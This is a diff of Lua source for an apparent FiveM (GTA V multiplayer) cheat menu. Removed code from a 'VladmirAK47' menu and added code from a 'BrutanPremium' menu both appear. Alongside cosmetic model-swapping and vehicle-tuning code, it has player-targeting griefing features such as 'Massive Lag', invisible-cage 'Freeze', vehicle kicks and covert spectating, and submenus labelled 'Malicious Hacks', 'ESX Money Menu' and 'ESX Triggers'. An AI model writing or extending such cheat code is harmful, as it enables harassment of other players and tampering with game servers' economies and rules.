-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean F 01') then
-			local model = "S_F_Y_MovPrem_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean F 02') then
-			local model = "A_F_M_KTown_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean F 03') then
-			local model = "A_F_M_KTown_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean F 04') then
-			local model = "A_F_O_KTown_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 01') then
-			local model = "A_M_M_MexCntry_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 02') then
-			local model = "A_M_M_MexLabor_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 03') then
-			local model = "A_M_Y_MexThug_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 04') then
-			local model = "G_M_M_MexBoss_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 05') then
-			local model = "G_M_M_MexBoss_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 06') then
-			local model = "U_M_Y_Mani"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican M 07') then
-			local model = "S_M_M_Mariachi_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican F') then
-			local model = "U_F_Y_SpyActress"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mexican HMaid F') then
-			local model = "S_F_M_Maid_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Boar') then
-			local model = "A_C_Boar"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Pig') then
-			local model = "A_C_Pig"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Deer') then
-			local model = "A_C_Deer"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Chicken') then
-			local model = "A_C_Hen"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Hawk') then
-			local model = "A_C_Chickenhawk"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Crow') then
-			local model = "A_C_Crow"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Monkey') then
-			local model = "A_C_Chimp"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Dog Chop') then
-			local model = "A_C_Chop"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Dog Husky') then
-			local model = "A_C_Husky"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Dog Rottweiler') then
-			local model = "A_C_Rottweiler"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Dog Shepherd') then
-			local model = "A_C_shepherd"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Lion') then
-			local model = "A_C_MtLion"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Rat') then
-			local model = "A_C_Rat"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Shark') then
-			local model = "A_C_SharkTiger"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model Animal~s~ Coyote') then
-			local model = "A_C_Coyote"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Alien') then
-			local model = "s_m_m_movalien_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Pongo') then
-			local model = "u_m_y_pogo_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Bartender F') then
-			local model = "S_F_Y_Bartender_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ FiveM') then
-			local model = "mp_m_freemode_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-			
-					
-				else ShowInfo("~r~Model not recognized")
-				    end
-                elseif VladmirAK47.Button('~c~~h~Randomize~s~ Clothing') then
-				     SetPedRandomComponentVariation(PlayerPedId(), true)
-                end
-					
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('OnlinePlayerMenu') then
-                for i = 0, 128 do
-                    if
-                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
-                            VladmirAK47.MenuButton(
-                                '~b~▶ ~s~' .. GetPlayerName(i) .. ' ~b~[' .. GetPlayerServerId(i) .. ']~s~ ~s~[' ..
-                                i .. ']~s~ ' .. (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~r~DEAD' or
-                                '~p~ALIVE'),
-                                'PlayerOptionsMenu'
-                            )
-                     then
-                        SelectedPlayer = i
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('PlayerOptionsMenu') then
-                VladmirAK47.SetSubTitle('PlayerOptionsMenu', 'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']')
-                if VladmirAK47.MenuButton('~h~~r~▶~s~ Undecetable Troll Options', 'Trollmenu2') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Vehicle Options', 'VehicleOptions') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Super Power Options', 'SuperPowerOptions') then					
-                elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Object Options', 'ObjectOptions') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Sound Options', 'SoundOptions') then				
-                elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Troll Options', 'Trollmenu') then
-				elseif VladmirAK47.MenuButton('~h~~r~▶~s~ Ped Options', 'Pedstuff') then
-                elseif VladmirAK47.Button('~h~Spectate', cC and '[SPECTATING]') then
-                    SpectatePlayer(SelectedPlayer)
-                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
-                    SetEntityVisible(dT, 0, 0)
-                    AttachEntityToEntity(
-                        dT,
-                        GetPlayerPed(SelectedPlayer),
-                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
-                        0,
-                        0,
-                        -1.0,
-                        0,
-                        0,
-                        0,
-                        false,
-                        true,
-                        true,
-                        true,
-                        1,
-                        true
-                    )
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Kick from Vehicle',
-                        freeze2,
-                        function(dR)
-                            freeze2 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then			 
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~freeze V2',
-                        freezeV1,
-                        function(dR)
-                           freezeV1 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then							
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Clone Skin',
-                        clone,
-                        function(dR)
-                           clone = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then											
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Attach to him',
-                        Shock99,
-                        function(dR)
-                           Shock99 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Massive Lag',
-                        TEST22,
-                        function(dR)
-                           TEST22 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-                elseif
-                    VladmirAK47.CheckBox(
-                        '~h~Brutan Lag',
-                        TEST31,
-                        function(dR)
-                           TEST31 = dR
-                        selectedPlayerId = SelectedPlayer
-                        end
-                    )
-                 then
-                elseif VladmirAK47.Button('~h~Freeze') then
-					local target = PlayerPedId(selectedPlayerId)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-					local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayer), 0, 0, -0.4)
-                    RequestModel('prop_gascage01')
-                    while not HasModelLoaded('prop_gascage01') do
-                        RequestModel('prop_gascage01')
-                        Citizen.Wait(0)
-                    end
-                    if HasModelLoaded('prop_gascage01') then
-					Citizen.Wait(100)
-						local v = CreateObject(GetHashKey('prop_gascage01'), pos.x, pos.y, pos.z, true, true, true)
-                        FreezeEntityPosition(v, true)
-                        SetEntityVisible(v, false, true)
 
-                    end				 
-                elseif VladmirAK47.Button('~h~Teleport To') then
-                    if cO then
-                        local confirm = KeyboardInput('Are you sure? y/n', '', 0)
-                        if confirm == 'y' then
-                            local Entity =
-                                IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
-                                PlayerPedId(-1)
-                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
-                        elseif confirm == 'n' then
-                            av('~h~~b~Operation cancelled~s~.', false)
-                        else
-                            av('~h~~b~Invalid Confirmation~s~.', true)
-                            av('~h~~b~Operation cancelled~s~.', false)
+        local currentTint = 1
+        local selectedTint = 1
+
+        BrutanPremium.CreateMenu("MainMenu", "BrutanPremium")
+        BrutanPremium.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
+		BrutanPremium.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
+        BrutanPremium.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
+        BrutanPremium.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
+        BrutanPremium.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
+        BrutanPremium.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
+		BrutanPremium.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
+        BrutanPremium.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
+        BrutanPremium.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
+        BrutanPremium.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
+        BrutanPremium.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
+        BrutanPremium.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
+        BrutanPremium.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
+		BrutanPremium.CreateSubMenu("Hedit", "VehMenu", "Handling")
+	    BrutanPremium.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
+        BrutanPremium.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
+		BrutanPremium.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
+        BrutanPremium.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
+        BrutanPremium.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
+        BrutanPremium.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
+        BrutanPremium.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
+        BrutanPremium.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
+		BrutanPremium.CreateSubMenu("AI", "MainMenu", "AI Menu")
+        BrutanPremium.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
+        BrutanPremium.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
+        BrutanPremium.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
+        BrutanPremium.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
+        BrutanPremium.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
+        BrutanPremium.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
+        BrutanPremium.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
+        BrutanPremium.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
+        BrutanPremium.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
+        BrutanPremium.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
+        BrutanPremium.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
+        BrutanPremium.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
+        BrutanPremium.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
+		BrutanPremium.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
+        BrutanPremium.CreateSubMenu("performance", "LSC", "Performance Tuning")
+        BrutanPremium.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
+        BrutanPremium.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
+        BrutanPremium.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
+		BrutanPremium.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
+        BrutanPremium.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
+		BrutanPremium.CreateSubMenu("Credits", "SettingsMenu", "Credits")
+for i, dA in pairs(bd) do 
+                BrutanPremium.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
+                BrutanPremium.CreateSubMenu("primary", dA.id, "Primary Paint") 
+                BrutanPremium.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
+                BrutanPremium.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
+                BrutanPremium.CreateSubMenu("classic1", "primary", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte1", "primary", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal1", "primary", "Metal Paint") 
+                BrutanPremium.CreateSubMenu("classic2", "secondary", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte2", "secondary", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal2", "secondary", "Metal Paint") 
+                BrutanPremium.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
+                BrutanPremium.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
+                BrutanPremium.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
+                BrutanPremium.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
+            end 
+        end
+        for i, dA in pairs(be) do 
+            BrutanPremium.CreateSubMenu(dA.id, "performance", dA.name) 
+        end
+    
+        local SelectedPlayer
+    
+            while Enabled do
+    
+                local ped = PlayerPedId() 
+                local veh = GetVehiclePedIsUsing(ped) 
+                SetVehicleModKit(veh, 0) 
+                for i, dA in pairs(bd) do
+                    if BrutanPremium.IsMenuOpened("tunings") then
+                        if b8 then
+                            if ba == "neon" then 
+                                local r, g, b = table.unpack(b9) 
+                                SetVehicleNeonLightsColour(veh, r, g, b) 
+                                SetVehicleNeonLightEnabled(veh, 0, bc) 
+                                SetVehicleNeonLightEnabled(veh, 1, bc) 
+                                SetVehicleNeonLightEnabled(veh, 2, bc) 
+                                SetVehicleNeonLightEnabled(veh, 3, bc) 
+                                b8 = false 
+                                ba = -1 
+                                b9 = -1 
+                            elseif ba == "paint" then 
+                                local dB, dC, dD, dA = table.unpack(b9) 
+                                SetVehicleColours(veh, dB, dC) 
+                                SetVehicleExtraColours(veh, dD, dA) 
+                                b8 = false
+                                ba = -1; 
+                                b9 = -1
+                            else 
+                                if bc == "rm" then 
+                                    RemoveVehicleMod(veh, ba) 
+                                    b8 = false 
+                                    ba = -1 
+                                    b9 = -1
+                                else 
+                                    SetVehicleMod(veh, ba, b9, false) 
+                                    b8 = false 
+                                    ba = -1 
+                                    b9 = -1 
+                                end 
+                            end 
+                        end 
+                    end
+    
+                    if BrutanPremium.IsMenuOpened(dA.id) then
+                        if dA.id == "wheeltypes" then
+                            if BrutanPremium.Button("Sport Wheels") then 
+                                SetVehicleWheelType(veh, 0) 
+                            elseif BrutanPremium.Button("Muscle Wheels") then 
+                                SetVehicleWheelType(veh, 1) 
+                            elseif BrutanPremium.Button("Lowrider Wheels") then 
+                                SetVehicleWheelType(veh, 2) 
+                            elseif BrutanPremium.Button("SUV Wheels") then 
+                                SetVehicleWheelType(veh, 3) 
+                            elseif BrutanPremium.Button("Offroad Wheels") then 
+                                SetVehicleWheelType(veh, 4) 
+                            elseif BrutanPremium.Button("Tuner Wheels") then 
+                                SetVehicleWheelType(veh, 5) 
+                            elseif BrutanPremium.Button("High End Wheels") then 
+                                SetVehicleWheelType(veh, 7) 
+                            end
+                                
+                            BrutanPremium.Display() 
+                        elseif dA.id == "extra" then 
+                            local dF = checkValidVehicleExtras() 
+                            for i, dA in pairs(dF) do
+                                if IsVehicleExtraTurnedOn(veh, i) then 
+                                    pricestring = "Installed"
+                                else 
+                                    pricestring = "Not Installed"
+                                end
+                                if BrutanPremium.Button(dA.menuName, pricestring) then 
+                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
+                                end 
+                            end 
+    
+                            BrutanPremium.Display() 
+                        elseif dA.id == "headlight" then
+                            if BrutanPremium.Button("None") then 
+                                SetVehicleHeadlightsColour(veh, -1) 
+                            end
+                            for dK, dA in pairs(bo) do 
+                                tp = GetVehicleHeadlightsColour(veh) 
+                                if tp == dA.id and not bg then 
+                                    pricetext = "Installed"
+                                else 
+                                    if bg and tp == dA.id then 
+                                        pricetext = "Previewing"
+                                    else pricetext = "Not Installed"
+                                    end 
+                                end
+                                head = GetVehicleHeadlightsColour(veh) 
+                                if BrutanPremium.Button(dA.name, pricetext) then
+                                    if not bg then 
+                                        bi = "headlight"
+                                        bk = false
+                                        oldhead = GetVehicleHeadlightsColour(veh) 
+                                        bh = table.pack(oldhead) 
+                                        SetVehicleHeadlightsColour(veh, dA.id) 
+                                        bg = true 
+                                    elseif bg and head == dA.id then 
+                                        ToggleVehicleMod(veh, 22, true) 
+                                        SetVehicleHeadlightsColour(veh, dA.id) 
+                                        bg = false; bi = -1; bh = -1 
+                                    elseif bg and head ~= dA.id then 
+                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
+                                    end 
+                                end 
+                            end
+    
+                                BrutanPremium.Display() 
+                        elseif dA.id == "neon" then
+                            if BrutanPremium.Button("None") then 
+                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
+                                SetVehicleNeonLightEnabled(veh, 0, false) 
+                                SetVehicleNeonLightEnabled(veh, 1, false) 
+                                SetVehicleNeonLightEnabled(veh, 2, false) 
+                                SetVehicleNeonLightEnabled(veh, 3, false) 
+                            end
+                            for i, dA in pairs(colors) do 
+                                colorr, colorg, colorb = table.unpack(dA) 
+                                r, g, b = GetVehicleNeonLightsColour(veh) 
+                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
+                                    pricestring = "Installed"
+                                else 
+                                    if b8 and colorr == r and colorg == g and colorb == b then 
+                                        pricestring = "Previewing"
+                                    else 
+                                        pricestring = "Not Installed"
+                                    end 
+                                end
+                                if BrutanPremium.Button(i, pricestring) then
+                                    if not b8 then 
+                                        ba = "neon"
+                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
+                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
+                                        b9 = table.pack(oldr, oldg, oldb) 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true) 
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = true 
+                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true)
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = false 
+                                        ba = -1 
+                                        b9 = -1 
+                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
+                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
+                                        SetVehicleNeonLightEnabled(veh, 0, true) 
+                                        SetVehicleNeonLightEnabled(veh, 1, true) 
+                                        SetVehicleNeonLightEnabled(veh, 2, true)
+                                        SetVehicleNeonLightEnabled(veh, 3, true) 
+                                        b8 = true 
+                                    end 
+                                end 
+                            end
+        
+                            BrutanPremium.Display() 
+                        elseif dA.id == "paint" then
+                            if BrutanPremium.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
+                            elseif BrutanPremium.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
+                            elseif BrutanPremium.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
+                            end 
+                            BrutanPremium.Display()
+                        else 
+                            local as = checkValidVehicleMods(dA.id) 
+                            for dG, dH in pairs(as) do
+                                if dH.menuName == "Stock" then 
+                                    price = 0 
+                                end
+                                if dA.name == "Horns" then
+                                    for dI, dJ in pairs(horns) do
+                                        if dJ ==dG - 1 then 
+                                            dH.menuName = dI 
+                                        end 
+                                    end 
+                                end
+                                if dH.menuName == "NULL" then 
+                                    dH.menuname = "unknown"
+                                end
+                                if BrutanPremium.Button(dH.menuName, price) then
+                                    if not b8 then 
+                                        ba = dA.id
+                                        b9 = GetVehicleMod(veh, dA.id) 
+                                        b8 = true
+                                        if dH.data.realIndex == -1 then 
+                                            bc = "rm"
+                                            RemoveVehicleMod(veh, dH.data.modid) 
+                                            b8 = false 
+                                            ba = -1 
+                                            b9 = -1 
+                                            bc = false
+                                        else 
+                                            bc = false 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                        end 
+                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
+                                        b8 = false 
+                                        ba = -1 
+                                        b9 = -1 
+                                        bc = false
+                                        if dH.data.realIndex == -1 then 
+                                            RemoveVehicleMod(veh, dH.data.modid)
+                                        else 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                        end 
+                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
+                                        if dH.data.realIndex == -1 then 
+                                            RemoveVehicleMod(veh, dH.data.modid) 
+                                            b8 = false 
+                                            ba = -1 
+                                            b9 = -1 
+                                            bc = false
+                                        else 
+                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
+                                            b8 = true 
+                                        end 
+                                    end 
+                                end 
+                            end 
+                                        BrutanPremium.Display() 
+                        end 
+                    end 
+                end
+    
+            for i, dA in pairs(be) do
+                if BrutanPremium.IsMenuOpened(dA.id) then
+                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
+                price1 = "Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Installed"
+                price4 = "Not Installed"
+                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Installed"
+                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
+                price1 = "Not Installed"
+                price2 = "Not Installed"
+                price3 = "Not Installed"
+                price4 = "Not Installed"
+            end
+            if BrutanPremium.Button("Stock "..dA.name, pricestock) then 
+                SetVehicleMod(veh, dA.id, -1) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 1", price1) then 
+                SetVehicleMod(veh, dA.id, 0) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 2", price2) then 
+                SetVehicleMod(veh, dA.id, 1) 
+            elseif BrutanPremium.Button(dA.name.." Upgrade 3", price3) then 
+                SetVehicleMod(veh, dA.id, 2) 
+            elseif dA.id ~= 13 and dA.id ~= 12 and BrutanPremium.Button(dA.name.." Upgrade 4", price4) then 
+                SetVehicleMod(veh, dA.id, 3) end; BrutanPremium.Display() 
+            end 
+        end
+
+            if BrutanPremium.IsMenuOpened("MainMenu") then
+                drawNotification("~h~~r~Brutan ~s~Premium")
+                drawNotification("~h~~s~BRUTAN ON YOUTUBE")
